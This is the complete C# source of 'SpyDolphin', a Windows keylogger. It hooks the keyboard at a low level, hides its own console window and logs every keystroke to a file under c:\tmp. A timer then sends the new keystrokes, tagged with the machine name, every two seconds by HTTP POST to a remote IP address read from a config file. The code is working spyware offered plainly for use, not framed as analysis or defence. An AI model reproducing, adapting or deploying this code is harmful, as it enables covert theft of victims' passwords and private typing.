using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;


namespace SpyDolphin
{
    class SpyDolphinCls
    {
        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        private const int WHKEYBOARDLL = 13;
        private const int MAX_CHAR_NUM = 7000;
        private const string LOG_PATH = @"c:\tmp\spdlphn\log.txt1";
        private const string IP_PATH = @"c:\tmp\spdlphn\ipdest.txt1";
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private delegate IntPtr LowLevelKeyboardProc( int nCode, IntPtr wParam, IntPtr lParam);
        private static System.Timers.Timer aTimer;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback( int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                //Application.StartupPath + LOG_PATH
                StreamWriter sw;
                try
                {
                    sw = new StreamWriter(LOG_PATH, true);
                }
                catch (Exception)
                {
                    // error occured
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
                //using ()
                {
                    sw.Write((Keys)vkCode);
                    sw.Close();
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        public static string prevSentData = "";
        private static void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            if (!File.Exists(LOG_PATH))
            {
                return;
            }
            // Read the file as one string. 
            string text = System.IO.File.ReadAllText(LOG_PATH);
            string dataToSend = "";
            if(prevSentData != text && prevSentData != "")
            {
                dataToSend = text.Replace(prevSentData,"");
                prevSentData = text;
            }
            if(prevSentData == "")
            {
                dataToSend = text;
                prevSentData = text;
            }
            if(dataToSend != "")
            {
                SendRequest("dolphin_new_data", DateTime.Now + " - " + Environment.MachineName + " - " + dataToSend);
            }
            if(text.Length > MAX_CHAR_NUM)
            {
                // delete the log file

                try
                {
                    System.IO.File.Delete(LOG_PATH);
                }
                catch (Exception)
                {
                    // file is in use

                }
            }


        }
        public static string SendRequest(String path, string postData)
        {
            byte[] byteArray = Encoding.UTF8.GetBytes(postData);
            return SendRequest(path, byteArray);
        }
        public static string readIP()
        {
            
            string line;
            System.IO.StreamReader file = new System.IO.StreamReader(IP_PATH);
            if ((line = file.ReadLine()) != null)
            {
                file.Close();
                return (line);
              
            }

            file.Close();
            return "172.0.0.1";
        }
        public static string SendRequest(String path,byte[] byteArray)
        {
            //read ip address from the text file
            string ipDest = readIP();
            WebRequest request = WebRequest.Create(ipDest + path);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            
            request.ContentLength = byteArray.Length;

            Stream dataStream;
            try
            {
                dataStream = request.GetRequestStream();
            }
            catch (Exception ex)
            {

                //seems like the server is down...
                return "";
            }
            dataStream.Write (byteArray, 0, byteArray.Length);
            dataStream.Close();
            // send the request

            WebResponse response;
            try
            {
                response = request.GetResponse();
                string respStatus = ((HttpWebResponse)response).StatusDescription;
                dataStream = response.GetResponseStream();
                
            }
            catch (Exception ex)
            {

                //seems like the server fails to send response
                return "";
            }
            // Open the stream using a StreamReader for easy access.
            StreamReader reader = new StreamReader(dataStream);
            // Read the content.
            string responseFromServer = reader.ReadToEnd();
            response.Close();
            return responseFromServer;
        }
        static void Main(string[] args)
        {
            // process path
            Directory.CreateDirectory(Path.GetDirectoryName(LOG_PATH));
       
            var handle = GetConsoleWindow();
            // Create a timer and set a two second interval.
            aTimer = new System.Timers.Timer();
            aTimer.Interval = 2000;
            // Hook up the Elapsed event for the timer. 
            aTimer.Elapsed += OnTimedEvent;

            // Have the timer fire repeated events (true is the default)
            aTimer.AutoReset = true;

            // Start the timer
            aTimer.Enabled = true;

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);

            SendRequest("dolphin_start", DateTime.Now + " - " + Environment.MachineName);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            
        }
    }
}
